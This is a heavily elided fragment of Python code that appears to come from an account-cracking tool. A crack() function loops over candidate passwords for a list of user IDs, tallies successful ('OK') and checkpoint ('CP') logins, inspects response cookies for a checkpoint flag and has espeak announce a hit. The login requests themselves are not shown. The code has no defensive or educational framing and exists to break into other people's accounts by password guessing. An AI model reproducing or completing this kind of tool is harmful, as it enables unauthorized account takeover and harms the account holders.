...
def passwrd():
	print(f"\x1b[1;97m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
	print(f"\x1b[1;94m-7ama-👻 : \x1b[1;97m{ha}\x1b[1;97m/\x1b[1;97m{bu}\x1b[1;97m/\x1b[1;97m{ta} ")
	print(f"\x1b[1;97m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r 7ama😶 {P}{b}{loop}{P} - {b}{len(id)}{P}  • OK:{P}{H}{ok}{P} -  CP:{P}{M}{cp}{P} • ({bo}{'{:.0%}'.format(loop/float(len(id)))}  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				os.system('espeak -a 300 " , bemnat ok ok ok Ok,  id password"')
